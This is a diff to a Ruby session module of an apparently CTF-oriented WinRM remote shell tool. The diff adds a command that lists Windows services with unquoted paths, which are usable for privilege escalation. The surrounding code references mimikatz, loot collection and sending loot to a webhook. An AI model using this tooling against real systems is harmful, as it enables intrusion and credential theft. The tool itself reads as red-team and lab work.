@@ -7,9 +7,11 @@ require_relative 'enums'
 require_relative 'sql_enum'
 require 'readline'
 require 'timeout'
+
 module EvilCTF::Session
   # Alias for the uploader helper
   Uploader = EvilCTF::Uploader
+
   # ------------------------------------------------------------------
   # Main session loop & command handling
   # ------------------------------------------------------------------
@@ -21,14 +23,14 @@ module EvilCTF::Session
     endpoint = "#{scheme}://#{host}:#{session_options[:port]}/wsman"
     session_options[:endpoint] = endpoint
     EvilCTF::ShellWrapper.socksify!(session_options[:proxy]) if session_options[:proxy]
-    puts "[*] Testing connection to #{orig_ip} (using #{host} in endpoint)..."
-   
+    puts "[*] Testing connection to #{orig_ip} (using #{host} in endpoint...)"
+
     # Use Kerberos authentication if specified
     if session_options[:kerberos]
       unless session_options[:user] && session_options[:realm]
         abort "[-] Kerberos requires --user and --realm"
       end
-     
+
       conn = WinRM::Connection.new(
         endpoint: endpoint,
         user: session_options[:user],
@@ -57,10 +59,12 @@ module EvilCTF::Session
         )
       end
     end
+
     shell = conn.shell(:powershell)
     logger = SessionLogger.new(session_options[:logfile]) # <-- defined below
     history = CommandHistory.new
     command_manager = EvilCTF::Tools::CommandManager.new
+
     # Setup PowerShell prompt and aliases
     shell.run(%q{
       function prompt {
@@ -68,10 +72,23 @@ module EvilCTF::Session
       }
       Set-Alias __exit__ Exit-PSSession
     })
+
     puts "[+] Connected to #{orig_ip}"
-    EvilCTF::Banner.show_banner_with_flagscan(shell, session_options)
+
+    # NEW: Use the new banner system with mode selection
+    banner_mode = session_options[:banner_mode] || :minimal
+    
+    # Backward compatibility: Check if new banner method exists, otherwise fall back to old method
+    if EvilCTF::Banner.respond_to?(:show_banner)
+      EvilCTF::Banner.show_banner(shell, session_options, mode: banner_mode)
+    else
+      # Fall back to original method for backward compatibility
+      EvilCTF::Banner.show_banner_with_flagscan(shell, session_options)
+    end
+
     setup_autocomplete(history)
     enum_cache = {}
+
     if session_options[:enum]
       puts "[*] Running enumeration preset: #{session_options[:enum]}"
       if session_options[:enum] == 'deep'
@@ -88,10 +105,12 @@ module EvilCTF::Session
                        fresh: session_options[:fresh])
       end
     end
+
     puts "Type 'help' for commands, '__exit__' or 'exit' to quit, or !bash for local shell.\n\n"
+
     # Main loop flag
     should_exit = false
-   
+
     loop do
       begin
         Timeout.timeout(1800) do
@@ -100,11 +119,14 @@ module EvilCTF::Session
           break if input.nil?
           input = input.strip
           next if input.empty?
+
           if input =~ /^(exit|quit|__exit__)$/i
             puts '[*] Exiting session...'
             break
           end
+
           history.add(input)
+
           case input
           when /^help$/i
             puts "\nBuiltin commands:"
@@ -122,6 +144,7 @@ module EvilCTF::Session
             puts ' history - Show command history'
             puts ' history clear - Clear history file'
             puts ' profile save <name> - Save current options as profile'
+            puts ' get-unquotedservices - Show all unquoted service paths'  # NEW COMMAND
             puts ' upload <local> <remote> - Upload file (original Evil-WinRM style)'
             puts ' download <remote> <local> - Download file (original Evil-WinRM style)'
             puts ' load_ps1 <local_ps1> - Upload and load PS1 script'
@@ -196,6 +219,17 @@ module EvilCTF::Session
             name = Regexp.last_match(1)
             EvilCTF::Tools.save_config_profile(name, session_options)
             next
+          # NEW: Unquoted Services Command
+          when /^get-unquotedservices$/i
+            puts "[*] Getting all unquoted service paths..."
+            unquoted_ps = <<~POWERSHELL
+              Get-CimInstance -Class Win32_Service | Where-Object { 
+                $_.PathName -notlike '`"*' -and $_.PathName -like '*.exe*' -and $_.PathName -like '* *'
+              } | Select-Object Name, DisplayName, PathName, State, StartMode | Format-Table -AutoSize
+            POWERSHELL
+            result = shell.run(unquoted_ps)
+            puts result.output
+            next
           when /^tool\s+(\w+)$/i
             key = Regexp.last_match(1)
             if key == 'all'
@@ -212,7 +246,7 @@ module EvilCTF::Session
                 tool = EvilCTF::Tools::TOOL_REGISTRY[key]
                 if tool && tool[:recommended_remote]
                   remote_path = tool[:recommended_remote]
-                 
+
                   # Handle different tool types properly to avoid hanging and resource leaks
                   case key
                   when 'mimikatz'
@@ -338,11 +372,13 @@ module EvilCTF::Session
             system(ENV['SHELL'] || '/bin/bash')
             next
           end
+
           # Macro expansion
           if command_manager.expand_macro(input, shell,
                                          webhook: session_options[:webhook])
             next
           end
+
           # Normal command path
           cmd = command_manager.expand_alias(input)
           start = Time.now
@@ -354,6 +390,7 @@ module EvilCTF::Session
             EvilCTF::Tools.save_loot(matches)
             EvilCTF::Tools.beacon_loot(session_options[:webhook], matches) if session_options[:webhook]
           end
+
           logger.log_command(cmd, result, elapsed,
                             '$PID', result.exitcode || 0)
           sleep(rand(30..90)) if session_options[:beacon]
@@ -374,10 +411,12 @@ module EvilCTF::Session
         raise e
       end
     end
+
     shell.close
     puts '[+] Session closed.'
     true
   end
+
   # ------------------------------------------------------------------
   # Helper utilities
   # ------------------------------------------------------------------
@@ -393,14 +432,17 @@ module EvilCTF::Session
       host
     end
   end
+
   def self.setup_autocomplete(history)
     Readline.completion_append_character = " "
     Readline.completion_proc = proc { |s| history.history.grep(/^#{Regexp.escape(s)}/) }
   end
+
   # Host parsing helpers (used for multi‑host support)
   def self.parse_hosts_file(hosts_file)
     hosts = []
     return hosts unless File.exist?(hosts_file)
+
     File.readlines(hosts_file).each do |line|
       line.strip!
       next if line.empty? || line.start_with?('#')
@@ -419,24 +461,48 @@ module EvilCTF::Session
     end
     hosts
   end
+
   # IPv6 handling (adds an entry to /etc/hosts)
   def self.add_ipv6_to_hosts(ip, hostname = 'ipv6addr')
     hosts_file = '/etc/hosts'
     entry = "#{ip} #{hostname}"
     return if File.exist?(hosts_file) && File.read(hosts_file).include?(entry)
+
     puts "[*] Adding IPv6 entry to #{hosts_file}: #{entry}"
     cmd = "echo '#{entry}' >> #{hosts_file}"
+
     if Process.uid == 0
       system(cmd)
     else
       system("sudo sh -c \"#{cmd}\"")
     end
+
     unless $?.success?
       puts "[!] Failed to add entry to #{hosts_file}. Please add manually: sudo echo '#{entry}' >> #{hosts_file}"
       exit 1
     end
+
     puts "[+] Entry added successfully"
   end
+
+  # ------------------------------------------------------------------
+  # Profile loading helper
+  # ------------------------------------------------------------------
+  def self.load_config_profile(profile_name)
+    profile_path = "profiles/#{profile_name}.yaml"
+    unless File.exist?(profile_path)
+      puts "[-] Profile not found: #{profile_path}"
+      return {}
+    end
+
+    begin
+      YAML.load_file(profile_path)
+    rescue => e
+      puts "[-] Failed to load profile: #{e.message}"
+      {}
+    end
+  end
+
   # ------------------------------------------------------------------
   # Logging helper
   # ------------------------------------------------------------------
@@ -446,6 +512,7 @@ module EvilCTF::Session
       @start = Time.now
       setup if @logfile
     end
+
     def setup
       FileUtils.mkdir_p(File.dirname(@logfile)) if @logfile && File.dirname(@logfile) != '.'
       File.open(@logfile, 'a') do |f|
@@ -453,6 +520,7 @@ module EvilCTF::Session
         f.puts
       end
     end
+
     def log_command(cmd, result, elapsed = nil, pid = nil, exit_code = nil)
       return unless @logfile
       File.open(@logfile, 'a') do |f|
@@ -463,6 +531,7 @@ module EvilCTF::Session
       end
     end
   end
+
   # ------------------------------------------------------------------
   # Command history helper
   # ------------------------------------------------------------------
@@ -470,15 +539,19 @@ module EvilCTF::Session
     def initialize
       @history = []
     end
+
     def add(cmd)
       @history << cmd
     end
+
     def show
       @history.each_with_index { |c, i| puts "#{i+1}: #{c}" }
     end
+
     def clear
       @history = []
     end
+
     def history
       @history
     end
